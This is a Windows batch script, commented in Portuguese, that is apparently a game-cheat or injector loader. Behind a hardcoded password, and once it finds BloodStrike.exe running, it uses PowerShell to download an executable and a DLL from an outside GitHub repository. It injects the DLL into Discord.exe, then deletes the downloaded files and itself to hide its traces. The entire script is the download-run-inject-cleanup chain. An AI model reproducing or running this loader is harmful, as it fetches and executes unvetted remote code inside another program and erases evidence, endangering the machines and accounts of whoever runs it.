@echo off
setlocal enabledelayedexpansion

:: Definir a senha correta
set "senha_correta=whats"

:: Solicitar a senha ao usuário
set /p "senha_digitada= "

:: Verificar se a senha está correta
if "!senha_digitada!" == "!senha_correta!" (
    :: Verificar se o processo bloodstrike está em execução
    tasklist /FI "IMAGENAME eq BloodStrike.exe" 2>NUL | find /I /N "BloodStrike.exe">NUL
    if "%ERRORLEVEL%"=="0" (
        cd /d %TEMP%

        :: Baixar os dois arquivos
        powershell -Command "Invoke-WebRequest -Uri 'https://github.com/strwkerk7/dll-injector/raw/main/intel.exe' -OutFile '%TEMP%\arquivo1.exe'"
        powershell -Command "Invoke-WebRequest -Uri 'https://github.com/strwkerk7/dll-injector/raw/main/intel.dll' -OutFile '%TEMP%\arquivo2.dll'"

        :: Executar o comando como se fosse digitado no CMD
        cmd /c "%TEMP%\arquivo1.exe --process-name Discord.exe --inject %TEMP%\arquivo2.dll"

        :: Aguardar 5 segundos
        timeout /t 5 /nobreak >nul

        :: Deletar os arquivos baixados
        del /f /q "%TEMP%\arquivo1.exe"
        del /f /q "%TEMP%\arquivo2.dll"

        :: Auto-deletar este script
        (goto) 2>nul & del "%~f0"
    ) else (
        echo O processo bloodstrike não está em execução.
    )
) else (
    exit
)